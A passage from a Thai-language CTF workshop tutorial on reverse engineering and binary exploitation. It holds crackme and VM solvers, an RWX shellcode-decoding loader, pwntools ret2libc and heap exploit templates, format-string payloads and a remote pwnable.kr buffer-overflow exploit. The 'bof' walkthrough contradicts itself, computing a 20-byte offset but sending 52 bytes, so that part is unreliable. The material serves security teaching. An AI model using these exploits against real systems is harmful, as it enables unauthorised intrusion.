serial[14] = chr(remaining + 33)  # ตัวที่เหลือ

print(f"Current serial: {''.join(serial)}")
print(f"Sum: {sum(ord(c) for c in serial)}")

# ตรวจสอบ XOR constraint
xor_val = 0
for i in range(8):
    xor_val ^= ord(serial[i]) ^ ord(serial[i+8])

print(f"XOR value: {hex(xor_val)} (need 0x42)")

# ปรับ XOR: แก้ไข serial[8] เพื่อให้ XOR ถูกต้อง
# serial[8] XOR ปัจจุบัน = xor_val XOR 0x42
# serial[8] ใหม่ = serial[8] เดิม XOR (xor_val XOR 0x42)
fix = xor_val ^ 0x42
new_char = ord(serial[8]) ^ fix
serial[8] = chr(new_char)

print(f"Fixed serial: {''.join(serial)}")
print(f"Verifying...")
final_xor = 0
for i in range(8):
    final_xor ^= ord(serial[i]) ^ ord(serial[i+8])
print(f"XOR: {hex(final_xor)}")
print(f"Sum: {sum(ord(c) for c in serial)}")
```

### วิธีที่ 4: ใช้ angr (Symbolic Execution)

```python
#!/usr/bin/env python3
# solve_crackme1_angr.py

import angr
import claripy

project = angr.Project('./crackme1', auto_load_libs=False)

# สร้าง symbolic input
serial = claripy.BVS('serial', 16*8)  # 16 bytes

# กำหนด state เริ่มต้น
state = project.factory.entry_state(
    args=['./crackme1'],
    stdin=claripy.Concat(serial, claripy.BVV(b'\n'))
)

# เพิ่ม constraints พื้นฐาน (printable ASCII)
for i in range(16):
    byte = serial.get_byte(i)
    state.solver.add(byte >= 0x20)
    state.solver.add(byte <= 0x7e)

# หา simulation
simgr = project.factory.simulation_manager(state)

# ค้นหา path ที่ไปถึง "Correct!"
# ต้องหา address ของ puts("Correct!...")
FIND_ADDR = 0x401234   # address ที่ print "Correct"
AVOID_ADDR = 0x401250  # address ที่ print "Wrong"

simgr.explore(find=FIND_ADDR, avoid=AVOID_ADDR)

if simgr.found:
    found_state = simgr.found[0]
    solution = found_state.solver.eval(serial, cast_to=bytes)
    print(f"Serial: {solution}")
else:
    print("No solution found")
```

---

## Rev Challenge 2: VM (Virtual Machine / Custom Bytecode)

### โจทย์

Binary ที่ implement virtual machine ขึ้นมาเอง และรัน bytecode program

```c
// vm_challenge.c
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

// VM registers
typedef struct {
    int regs[8];    // R0-R7
    int pc;         // program counter
    int flags;      // comparison flags
    int stack[256];
    int sp;         // stack pointer
} VM;

// Instruction set
#define OP_MOV   0x01   // MOV Rd, imm
#define OP_ADD   0x02   // ADD Rd, Rs
#define OP_SUB   0x03   // SUB Rd, Rs
#define OP_CMP   0x04   // CMP Ra, Rb
#define OP_JE    0x05   // JE offset
#define OP_JNE   0x06   // JNE offset
#define OP_PUSH  0x07   // PUSH Rs
#define OP_POP   0x08   // POP Rd
#define OP_XOR   0x09   // XOR Rd, Rs
#define OP_PRINT 0x0A   // PRINT Rs (print register as char)
#define OP_HALT  0xFF   // HALT

// Bytecode program (ที่ต้องหา flag)
unsigned char program[] = {
    OP_MOV, 0, 'f',   // R0 = 'f'
    OP_MOV, 1, 'l',   // R1 = 'l'
    OP_MOV, 2, 'a',   // R2 = 'a'
    OP_MOV, 3, 0x67,  // R3 = 'g'
    OP_MOV, 4, '{',   // R4 = '{'
    OP_MOV, 5, 'v',   // R5 = 'v'
    OP_MOV, 6, 'm',   // R6 = 'm'
    OP_MOV, 7, '}',   // R7 = '}'
    OP_PRINT, 0,      // print R0 = 'f'
    OP_PRINT, 1,      // print R1 = 'l'
    OP_PRINT, 2,      // print R2 = 'a'
    OP_PRINT, 3,      // print R3 = 'g'
    OP_PRINT, 4,      // print R4 = '{'
    OP_PRINT, 5,      // print R5 = 'v'
    OP_PRINT, 6,      // print R6 = 'm'
    OP_PRINT, 7,      // print R7 = '}'
    OP_HALT,
};
```

### วิธีวิเคราะห์ VM Challenge

**ขั้นตอนที่ 1: Understand VM architecture**

```
เมื่อเห็น binary ที่มี VM ให้หา:
1. Instruction set (opcodes) - OP_MOV, OP_ADD, etc.
2. Registers - จำนวนและขนาด
3. Memory model - stack, heap, data segment
4. Dispatch loop - main loop ที่ fetch/decode/execute
```

**ขั้นตอนที่ 2: Decompile Dispatch Loop**

```c
// จาก Ghidra/IDA เราได้ประมาณนี้:
void execute_vm(VM *vm, unsigned char *bytecode, int len) {
    while (vm->pc < len) {
        unsigned char opcode = bytecode[vm->pc++];
        
        switch (opcode) {
            case 0x01:  // MOV Rd, imm
                vm->regs[bytecode[vm->pc++]] = bytecode[vm->pc++];
                break;
            case 0x02:  // ADD Rd, Rs
                vm->regs[bytecode[vm->pc]] += vm->regs[bytecode[vm->pc+1]];
                vm->pc += 2;
                break;
            // ...
            case 0xFF:  // HALT
                return;
        }
    }
}
```

**ขั้นตอนที่ 3: Disassemble Bytecode**

เขียน disassembler สำหรับ VM นี้:

```python
#!/usr/bin/env python3
# vm_disasm.py - disassembler สำหรับ custom VM

bytecode = bytes.fromhex(
    "010066"   # MOV R0, 'f'
    "01016c"   # MOV R1, 'l'
    "010261"   # MOV R2, 'a'
    "010367"   # MOV R3 'g'
    "01047b"   # MOV R4, '{'
    "010576"   # MOV R5, 'v'
    "01066d"   # MOV R6, 'm'
    "01077d"   # MOV R7, '}'
    "0a00"     # PRINT R0
    "0a01"     # PRINT R1
    # ...
    "ff"       # HALT
)

OPCODES = {
    0x01: ('MOV',   2),   # Rd, imm
    0x02: ('ADD',   2),   # Rd, Rs
    0x03: ('SUB',   2),   # Rd, Rs
    0x04: ('CMP',   2),   # Ra, Rb
    0x05: ('JE',    1),   # offset
    0x06: ('JNE',   1),   # offset
    0x07: ('PUSH',  1),   # Rs
    0x08: ('POP',   1),   # Rd
    0x09: ('XOR',   2),   # Rd, Rs
    0x0A: ('PRINT', 1),   # Rs
    0xFF: ('HALT',  0),
}

pc = 0
while pc < len(bytecode):
    opcode = bytecode[pc]
    
    if opcode not in OPCODES:
        print(f"  {pc:04x}: ??? {opcode:02x}")
        pc += 1
        continue
    
    mnemonic, operands = OPCODES[opcode]
    args = bytecode[pc+1 : pc+1+operands]
    
    # Format instruction
    if mnemonic == 'MOV':
        reg, imm = args
        char_repr = f" ('{chr(imm)}')" if 0x20 <= imm <= 0x7e else ""
        print(f"  {pc:04x}: {mnemonic} R{reg}, 0x{imm:02x}{char_repr}")
    elif mnemonic == 'PRINT':
        print(f"  {pc:04x}: {mnemonic} R{args[0]}")
    elif mnemonic == 'HALT':
        print(f"  {pc:04x}: {mnemonic}")
    else:
        print(f"  {pc:04x}: {mnemonic} R{args[0]}, R{args[1]}")
    
    pc += 1 + operands
```

**ขั้นตอนที่ 4: Emulate VM**

```python
#!/usr/bin/env python3
# vm_emulate.py - emulator สำหรับ custom VM

class VM:
    def __init__(self):
        self.regs  = [0] * 8
        self.pc    = 0
        self.flags = 0
        self.stack = []
        self.output = []

def execute(bytecode):
    vm = VM()
    
    while vm.pc < len(bytecode):
        opcode = bytecode[vm.pc]
        vm.pc += 1
        
        if opcode == 0x01:  # MOV Rd, imm
            rd  = bytecode[vm.pc]; vm.pc += 1
            imm = bytecode[vm.pc]; vm.pc += 1
            vm.regs[rd] = imm
            
        elif opcode == 0x02:  # ADD Rd, Rs
            rd = bytecode[vm.pc]; vm.pc += 1
            rs = bytecode[vm.pc]; vm.pc += 1
            vm.regs[rd] += vm.regs[rs]
            
        elif opcode == 0x09:  # XOR Rd, Rs
            rd = bytecode[vm.pc]; vm.pc += 1
            rs = bytecode[vm.pc]; vm.pc += 1
            vm.regs[rd] ^= vm.regs[rs]
            
        elif opcode == 0x0A:  # PRINT Rs
            rs = bytecode[vm.pc]; vm.pc += 1
            vm.output.append(chr(vm.regs[rs] & 0xFF))
            
        elif opcode == 0xFF:  # HALT
            break
    
    return ''.join(vm.output)

# อ่าน bytecode จากไฟล์
with open('./vm_program.bin', 'rb') as f:
    code = f.read()

result = execute(code)
print(f"VM output: {result}")
```

---

## Rev Challenge 3: Obfuscation

### ประเภทของ Obfuscation

1. **String XOR**: strings ถูก XOR ด้วย key แล้วเก็บใน binary
2. **Junk code**: code ที่ไม่มีประโยชน์สำหรับ confuse analyst
3. **Control flow obfuscation**: ทำให้ flow ดูซับซ้อน
4. **Self-modifying code**: code แก้ไขตัวเอง runtime

### String XOR Obfuscation

```c
// obfuscated.c
#include <stdio.h>
#include <string.h>

// String ที่ถูก XOR ด้วย key 0x55
unsigned char enc_flag[] = {
    0x33, 0x39, 0x36, 0x36, 0x73, 0x65, 0x7a, 0x62, 
    0x2a, 0x7a, 0x36, 0x37, 0x36, 0x75, 0x73, 0x72,
    0x27, 0x55
};
// XOR 0x55: f=0x66^0x55=0x33, l=0x6c^0x55=0x39, ...

void decode_string(unsigned char *enc, int len, unsigned char key) {
    for (int i = 0; i < len; i++) {
        enc[i] ^= key;
    }
}

int main() {
    unsigned char flag[sizeof(enc_flag)];
    memcpy(flag, enc_flag, sizeof(enc_flag));
    decode_string(flag, sizeof(enc_flag), 0x55);
    printf("%s\n", flag);
    return 0;
}
```

**วิเคราะห์ด้วย GDB:**

```bash
# วาง breakpoint หลัง decode
(pwndbg) break *decode_string+100    # หลัง function return
(pwndbg) run
(pwndbg) x/s flag_address            # อ่าน string ที่ decode แล้ว
```

**วิเคราะห์ด้วย Python:**

```python
#!/usr/bin/env python3
# deobfuscate_xor.py

enc_flag = bytes([
    0x33, 0x39, 0x36, 0x36, 0x73, 0x65, 0x7a, 0x62,
    0x2a, 0x7a, 0x36, 0x37, 0x36, 0x75, 0x73, 0x72,
    0x27, 0x55
])

# ลอง XOR กับทุก possible key (brute force)
for key in range(256):
    decoded = bytes(b ^ key for b in enc_flag)
    try:
        text = decoded.decode('ascii')
        if 'flag' in text.lower() or '{' in text:
            print(f"Key 0x{key:02x}: {text}")
    except:
        pass

# ถ้ารู้ว่า key = 0x55
key = 0x55
decoded = bytes(b ^ key for b in enc_flag)
print(f"Decoded: {decoded}")
```

**ใช้ xortool สำหรับ XOR ที่ซับซ้อน:**

```bash
# ติดตั้ง
pip install xortool

# วิเคราะห์ XOR key
xortool -x enc_data.bin

# ลอง key ที่น่าจะเป็น
xortool -k 55 enc_data.bin
```

### Self-Modifying Code

```c
// selfmod.c
#include <stdio.h>
#include <sys/mman.h>
#include <string.h>

// Code ที่ถูก XOR ไว้ (จะ decode และ execute runtime)
unsigned char enc_code[] = {
    // ... encrypted shellcode/code
};

int main() {
    // Allocate executable memory
    void *exec_mem = mmap(NULL, sizeof(enc_code),
                         PROT_READ|PROT_WRITE|PROT_EXEC,
                         MAP_PRIVATE|MAP_ANONYMOUS, -1, 0);
    
    // Decode code
    for (int i = 0; i < sizeof(enc_code); i++) {
        ((char*)exec_mem)[i] = enc_code[i] ^ 0xCC;
    }
    
    // Execute decoded code
    ((void(*)())exec_mem)();
    
    munmap(exec_mem, sizeof(enc_code));
    return 0;
}
```

**วิธีวิเคราะห์ Self-Modifying Code:**

```bash
# ใช้ GDB dump memory หลัง decode
(pwndbg) break *main+50    # breakpoint หลัง decode loop
(pwndbg) run
(pwndbg) dump memory /tmp/decoded.bin exec_mem_start exec_mem_end

# ดู disassembly ของ decoded code
objdump -d -M intel --start-address=0 /tmp/decoded.bin
```

**ด้วย Frida:**

```javascript
// frida_dump.js
// frida -l frida_dump.js ./selfmod

Interceptor.attach(Module.findExportByName(null, 'mmap'), {
    onLeave: function(retval) {
        // หลัง mmap return
        setTimeout(() => {
            var addr = retval;
            var size = 1024;  // ปรับตามขนาดจริง
            var data = Memory.readByteArray(addr, size);
            
            // เขียนลงไฟล์
            var file = new File('/tmp/dumped_code.bin', 'wb');
            file.write(data);
            file.close();
            
            console.log('[*] Dumped code to /tmp/dumped_code.bin');
        }, 100);
    }
});
```

---

## pwntools Template สมบูรณ์

### Template สำหรับ Local Binary

```python
#!/usr/bin/env python3
"""
CTF Exploit Template - Local Binary
Challenge: [ชื่อ challenge]
Category: Pwn
"""

from pwn import *
import sys

# ========================================
# Configuration
# ========================================
BINARY = './challenge'
LIBC   = '/lib/x86_64-linux-gnu/libc.so.6'
# LIBC   = './libc.so.6'  # สำหรับ remote

context.arch      = 'amd64'   # หรือ 'i386'
context.os        = 'linux'
context.log_level = 'info'    # 'debug' สำหรับ verbose
context.terminal  = ['tmux', 'splitw', '-h']

# ========================================
# Helper Functions
# ========================================
def start(argv=[], *a, **kw):
    """Start binary locally หรือ remote"""
    if args.GDB:
        return gdb.debug([BINARY] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:
        return remote(sys.argv[1], int(sys.argv[2]))
    else:
        return process([BINARY] + argv, *a, **kw)

gdbscript = '''
break main
break vulnerable
continue
'''.strip()

# ========================================
# Exploit
# ========================================
def exploit():
    p = start()
    
    elf  = ELF(BINARY)
    libc = ELF(LIBC)
    rop  = ROP(elf)
    
    # ----------- Find offset -----------
    OFFSET = 72  # หาด้วย cyclic + GDB
    
    # ----------- Find gadgets -----------
    POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
    RET     = rop.find_gadget(['ret'])[0]
    
    log.info(f"pop rdi: {hex(POP_RDI)}")
    
    # ----------- Stage 1: Leak -----------
    payload1  = flat(
        b'A' * OFFSET,
        POP_RDI, elf.got['puts'],
        elf.plt['puts'],
        elf.sym['main'],
    )
    
    p.sendlineafter(b'Input: ', payload1)
    
    # Parse leak
    p.recvuntil(b'Output: ')
    leak = u64(p.recvline().strip().ljust(8, b'\x00'))
    log.success(f"Leak: {hex(leak)}")
    
    # Calculate libc base
    libc.address = leak - libc.sym['puts']
    log.success(f"libc @ {hex(libc.address)}")
    
    # ----------- Stage 2: Shell -----------
    system = libc.sym['system']
    binsh  = next(libc.search(b'/bin/sh'))
    
    payload2 = flat(
        b'A' * OFFSET,
        RET,       # alignment
        POP_RDI, binsh,
        system,
    )
    
    p.sendlineafter(b'Input: ', payload2)
    
    # ----------- Shell -----------
    p.interactive()

if __name__ == '__main__':
    exploit()
```

### Template สำหรับ Remote + Local Libc

```python
#!/usr/bin/env python3
"""
CTF Exploit Template - Remote Challenge with libc leak
"""

from pwn import *
import sys

# ========================================
# Setup
# ========================================
HOST = 'ctf.example.com'
PORT = 4444

BINARY = './challenge'
LIBC   = './libc-2.31.so'   # ดาวน์โหลดจาก server หรือ challenge files
LD     = './ld-2.31.so'     # linker สำหรับ test locally

context.arch      = 'amd64'
context.log_level = 'info'

def conn():
    if args.LOCAL:
        # รันด้วย libc เดียวกับ server
        p = process([LD, BINARY], env={'LD_PRELOAD': LIBC})
    elif args.GDB:
        p = gdb.debug([LD, BINARY], env={'LD_PRELOAD': LIBC},
                     gdbscript='break main\ncontinue')
    else:
        p = remote(HOST, PORT)
    return p

# ========================================
# Exploit
# ========================================
elf  = ELF(BINARY)
libc = ELF(LIBC)

def exploit():
    p = conn()
    rop = ROP(elf)
    
    # ... exploit code ...
    
    p.interactive()

exploit()
```

### Template สำหรับ Heap Challenge

```python
#!/usr/bin/env python3
"""
CTF Heap Exploit Template
"""

from pwn import *

BINARY = './heap_challenge'
context.arch = 'amd64'

p = process(BINARY)
elf  = ELF(BINARY)
libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')

# Helper functions สำหรับ menu-driven programs
def add(size, data):
    p.sendlineafter(b'> ', b'1')
    p.sendlineafter(b'Size: ', str(size).encode())
    p.sendlineafter(b'Data: ', data)

def delete(idx):
    p.sendlineafter(b'> ', b'2')
    p.sendlineafter(b'Index: ', str(idx).encode())

def show(idx):
    p.sendlineafter(b'> ', b'3')
    p.sendlineafter(b'Index: ', str(idx).encode())
    return p.recvuntil(b'\n', drop=True)

def edit(idx, data):
    p.sendlineafter(b'> ', b'4')
    p.sendlineafter(b'Index: ', str(idx).encode())
    p.sendlineafter(b'Data: ', data)

# Exploit:
# 1. Leak heap address
# 2. Leak libc address (ผ่าน unsorted bin)
# 3. Overwrite __malloc_hook / __free_hook
# 4. Trigger hook → shell

p.interactive()
```

---

## เทคนิคเพิ่มเติม

### การ Identify libc version

```bash
# วิธีที่ 1: ดูจาก leaked address
# libc database: https://libc.blukat.me/
# ใส่ function name + last 3 hex digits ของ leaked address

# วิธีที่ 2: ใช้ pwntools
strings ./libc.so.6 | grep "GNU C Library"
# GNU C Library (Ubuntu GLIBC 2.31-13ubuntu11) stable release version 2.31

# วิธีที่ 3: ใช้ libc-database
git clone https://github.com/niklasb/libc-database
cd libc-database
./get ubuntu   # ดาวน์โหลด ubuntu libcs
./find puts 0xXXXXX  # หา libc จาก leaked address
```

### patchelf: แก้ไข Binary ให้ใช้ libc ที่ต้องการ

```bash
# แก้ให้ใช้ libc เฉพาะ
patchelf --set-interpreter ./ld-2.31.so ./challenge
patchelf --set-rpath ./ ./challenge
patchelf --replace-needed libc.so.6 ./libc-2.31.so ./challenge

# หรือใช้ pwninit (สะดวกกว่า)
pip install pwninit
pwninit --binary ./challenge --libc ./libc.so.6
```

### Stack Alignment ใน 64-bit

```
System V AMD64 ABI กำหนดว่า RSP ต้องเป็น 16-byte aligned
ก่อน call instruction

ถ้า system("/bin/sh") crash ให้เพิ่ม ret gadget ก่อน:

payload += p64(ret_gadget)   # align stack
payload += p64(pop_rdi)
payload += p64(binsh)
payload += p64(system)
```

### Format String Exploitation

```c
// vulnerable code
printf(user_input);  // ไม่มี format string → ช่องโหว่!

// อ่าน stack
%p %p %p %p %p %p %p %p

// อ่าน memory ที่ address ที่กำหนด
\x78\x56\x34\x12%s  # อ่านจาก address 0x12345678

// เขียน memory (ใช้ %n)
\x78\x56\x34\x12%100c%7$n  # เขียน 104 ลงที่ address 0x12345678
```

---

## เคล็ดลับ CTF (Tips & Tricks)

### Pwn Tips

```
1. เสมอ checksec ก่อนทำอะไร
2. ถ้าไม่มี PIE → addresses คงที่ → ง่ายกว่า
3. ถ้าไม่มี canary → overflow ง่าย
4. ถ้าไม่มี RELRO → overwrite GOT ได้
5. หา win function ก่อนเสมอ (ถ้ามี)
6. ดู strings หา hints
7. อ่าน libc version จาก binary
8. ลอง ret2win ก่อนเสมอ (ง่ายสุด)
9. ถ้า binary มี read() → ส่งได้หลาย bytes → overflow ง่าย
10. stack alignment 16-byte ใน 64-bit!
```

### Reverse Engineering Tips

```
1. strings ก่อนเสมอ
2. ltrace/strace → เห็น function calls
3. Ghidra ฟรีและดีมาก
4. ดู main() ก่อน → trace from there
5. rename variables ใน Ghidra ตามที่เข้าใจ
6. ถ้าเห็น comparison → อาจเป็น password check
7. angr สำหรับ constraint solving
8. dynamic analysis เสมอ (GDB)
9. ดู imports → รู้ว่า binary ใช้ function อะไร
10. anti-debug: ptrace check, timing check → patch หรือ bypass
```

### Crypto Tips

```
1. หา algorithm จาก key/iv size
2. AES-128 = 16-byte key
3. RSA: ถ้า e เล็กมาก → Wiener's attack
4. XOR cipher → ใช้ xortool
5. Caesar cipher → brute force
6. Base64 ≠ encryption (เป็นแค่ encoding)
7. hash online databases: crackstation.net
8. ดู encoding pattern: base64, hex, rot13
```

### เว็บไซต์ที่มีประโยชน์

```
CTF Platforms:
- picoctf.org          (เหมาะสำหรับผู้เริ่มต้น)
- ctflearn.com         (เรียนรู้ทีละขั้น)
- pwnable.kr           (pwn challenges)
- pwnable.tw           (pwn challenges)
- reversing.kr         (rev challenges)
- cryptohack.org       (crypto challenges)
- overthewire.org      (wargames)
- hackthebox.eu        (หลากหลาย)
- tryhackme.com        (guided challenges)

Tools Online:
- gchq.github.io/CyberChef    (Swiss Army knife)
- crackstation.net            (hash cracking)
- libc.blukat.me              (libc database)
- godbolt.org                 (compiler explorer)

Write-ups:
- ctftime.org                 (CTF calendar + writeups)
- github.com/search?q=ctf+writeup
```

---

## ตัวอย่าง Exploit สมบูรณ์: pwnable.kr - bof

ตัวอย่างการ exploit challenge จริงจาก pwnable.kr:

```c
// bof.c (source ที่ให้มา)
#include <stdio.h>
#include <string.h>
#include <stdlib.h>

void func(int key){
    char overflowme[32];
    printf("overflow me : ");
    gets(overflowme);
    
    if(key == 0xcafebabe){
        system("/bin/sh");
    }
    else {
        printf("Nah..\n");
    }
}

int main(int argc, char* argv[]){
    func(0xdeadbeef);
    return 0;
}
```

**Analysis:**
```
Stack layout ใน func():
[overflowme: 32 bytes][...padding...][key: 4 bytes]

เราต้องทำให้ key == 0xcafebabe
key อยู่บน stack ห่างจาก overflowme เท่าไหร่?
```

**GDB Analysis:**
```bash
(pwndbg) disassemble func
   0x0000000000400616 <+0>:     push   rbp
   0x0000000000400617 <+1>:     mov    rbp,rsp
   0x000000000040061a <+4>:     sub    rsp,0x50
   0x000000000040061e <+8>:     mov    DWORD PTR [rbp-0x44],edi  ← key อยู่ที่ rbp-0x44
   0x0000000000400621 <+11>:    lea    rax,[rbp-0x30]             ← overflowme อยู่ที่ rbp-0x30
   
# offset จาก overflowme ถึง key:
# (-0x30) - (-0x44) = 0x14 = 20 bytes
# ดังนั้น: 20 bytes padding + p32(0xcafebabe)
```

**Exploit:**
```python
#!/usr/bin/env python3
# exploit_bof.py

from pwn import *

# p = process('./bof')
p = remote('pwnable.kr', 9000)

payload  = b'A' * 52     # เติมจน key
payload += p32(0xcafebabe) # overwrite key

p.sendlineafter(b'overflow me : ', payload)
p.interactive()
```

---

## การเรียนรู้เพิ่มเติม

### Learning Path สำหรับ CTF Pwn

```
Beginner:
1. เรียน x86-64 assembly พื้นฐาน
2. เข้าใจ stack layout
3. Buffer overflow พื้นฐาน (ret2win)
4. ทำ picoCTF binary exploitation challenges

Intermediate:
5. ret2libc + ASLR bypass
6. ROP chains
7. Format string vulnerabilities
8. GOT overwrite
9. ทำ pwnable.kr, pwnable.tw

Advanced:
10. Heap exploitation (fastbin, tcache, unsorted bin)
11. Use-after-free
12. House of techniques
13. Kernel exploitation basics
14. ทำ DEF CON CTF quals challenges
```

### Learning Path สำหรับ CTF Rev

```
Beginner:
1. เรียน x86-64 assembly
2. ใช้ Ghidra/IDA พื้นฐาน
3. Simple crackmes
4. picoCTF rev challenges

Intermediate:
5. Anti-debugging bypass
6. Packed binaries (upx)
7. Custom VM/bytecode
8. Obfuscation techniques

Advanced:
9. Code coverage analysis
10. Symbolic execution (angr, triton)
11. Advanced anti-analysis
12. Windows malware analysis
```

### Resources ที่แนะนำ

```
Books:
- "Hacking: The Art of Exploitation" by Jon Erickson
- "The Shellcoder's Handbook"
- "Practical Binary Analysis" by Dennis Andriesse
- "Reversing: Secrets of Reverse Engineering" by Eldad Eilam

Online Courses:
- LiveOverflow (YouTube) - excellent binary exploitation videos
- pwn.college - structured pwn learning
- OpenSecurityTraining2

Papers/References:
- phrack.org - classic security papers
- exploit-db.com - exploit database
```

---

## สรุป

CTF เป็นเครื่องมือที่ดีเยี่ยมสำหรับการเรียนรู้ cybersecurity แบบ practical ประเด็นสำคัญที่ควรจำ:

**Pwn:**
- ทำ checksec ก่อนเสมอ
- หา offset ด้วย cyclic pattern
- ret2win → ret2libc → ROP chains เป็นขั้นบันได
- Stack alignment 16-byte ใน 64-bit

**Reverse Engineering:**
- Static + Dynamic analysis ควบคู่กัน
- Ghidra/IDA + GDB
- angr สำหรับ constraint solving อัตโนมัติ
- ทำความเข้าใจ algorithm ก่อน implement solution

**Tools สำคัญ:**
- pwntools: Python library สำหรับ exploit
- GDB + pwndbg: debugging
- ROPgadget: หา ROP gadgets
- one_gadget: หา one-shot shell gadget
- Ghidra: static analysis/decompiler
- checksec, file, strings: reconnaissance

**ข้อควรระวัง:**
- ฝึกบน lab environment ของตัวเอง
- อย่า exploit systems โดยไม่ได้รับอนุญาต
- CTF challenges ออกแบบมาเพื่อการเรียนรู้เท่านั้น
- ความรู้นี้ใช้สำหรับ defensive security ด้วย

---

*Part 080 - CTF Challenges Workshop | Assembly & Security Course*
*เนื้อหานี้เป็น educational content สำหรับการเรียนรู้ด้าน cybersecurity ผ่าน CTF competitions*
